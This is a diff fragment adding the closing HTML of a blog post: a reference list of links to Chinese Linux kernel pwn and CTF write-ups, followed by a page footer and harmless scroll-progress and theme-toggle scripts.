+</span></span></code></pre></div><h2 id="参考">参考<a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h2>
+<blockquote>
+<p><a href="https://bbs.kanxue.com/thread-276403.htm#msg_header_h2_1">[原创]Kernel PWN从入门到提升-Pwn-看雪-安全社区|安全招聘|kanxue.com</a>
+<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x00-%E7%BB%AA%E8%AE%BA">【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF - arttnba3&rsquo;s blog</a>
+<a href="https://arttnba3.cn/2021/02/21/OS-0X01-LINUX-KERNEL-PART-II/#0x00-%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D">【OS.0x01】Linux Kernel II：内核简易食用指北 - arttnba3&rsquo;s blog</a>
+<a href="https://xz.aliyun.com/news/15823">2024网鼎杯半决赛-pwn-先知社区</a>
+<a href="https://www.cnblogs.com/m00nflower/p/17012224.html">强网杯2018 - core 学习记录 - moon_flower - 博客园</a>
+<a href="https://x3h1n.github.io/2019/07/04/2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/">2018强网杯 core | X3h1n</a></p>
+</blockquote>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<a href="#top" aria-label="go to top" class="top-link" id="top-link">
+    <span class="topInner">
+        <svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+        <span id="read_progress"></span>
+    </span>
+</a>
+
+<script>
+    
+    document.addEventListener('scroll', function () {
+        const readProgress = document.getElementById("read_progress");
+
+        const scrollTop = window.scrollY;
+        const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+
+        let percent = scrollTop / docHeight;
+        percent = Math.min(Math.max(percent, 0), 1);
+
+        readProgress.innerText = Math.round(percent * 100) + "%";
+    });
+
+    
+    const topBtn = document.getElementById("top-link");
+    window.addEventListener("scroll", function () {
+        if (document.documentElement.scrollTop > 200) {
+            topBtn.style.visibility = "visible";
+            topBtn.style.opacity = "1";
+        } else {
+            topBtn.style.visibility = "hidden";
+            topBtn.style.opacity = "0";
+        }
+    });
+</script>
+<script>
+    
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    });
+</script></body>
+
+</html>
